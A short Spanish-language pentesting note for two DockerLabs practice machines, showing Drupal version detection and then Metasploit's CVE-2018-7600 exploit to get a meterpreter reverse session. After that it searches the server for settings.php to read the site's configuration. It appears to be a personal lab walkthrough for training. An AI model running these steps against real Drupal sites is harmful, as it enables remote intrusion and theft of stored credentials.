- Tags: #cms #recursos #enumeration #enumeration_drupal

Maquinas FindYourStile y ejotapte en dockerlabs

```bash
whatweb http://ip/

#Detectamos la version de drupal y hacemos una busqueda en interne de la version par ver si tiene exploits. Drupall 8 exploit , detectamos un CVE asociada a la version y lo buscamos en msfvenon o lo buscamos por la version de drupal

msfconsole

>search Drupal 8  |  search CVE-2018-7600
>use numero_exploit
>set LHOST
>set RHOST
>run
#Obtenemos una sesion de meterpreter. Buscamos archivos importantes de drupal donde tiene info de su configuracion 

find / -name settings.php 2>/dev/null 
```

ejotapte , esta maquina el drupal no corre en la raiz del servidor

```bash
dir http://ip/

msfconsole

>search Drupal 8  |  search CVE-2018-7600
>use numero_exploit
>set LHOST
>set RHOST
>set PORT
>set TARGETURI drupal/

#Obtenemos una sesion de meterpreter. Buscamos archivos importantes de drupal donde tiene info de su configuracion 

find / -name settings.php 2>/dev/null 

```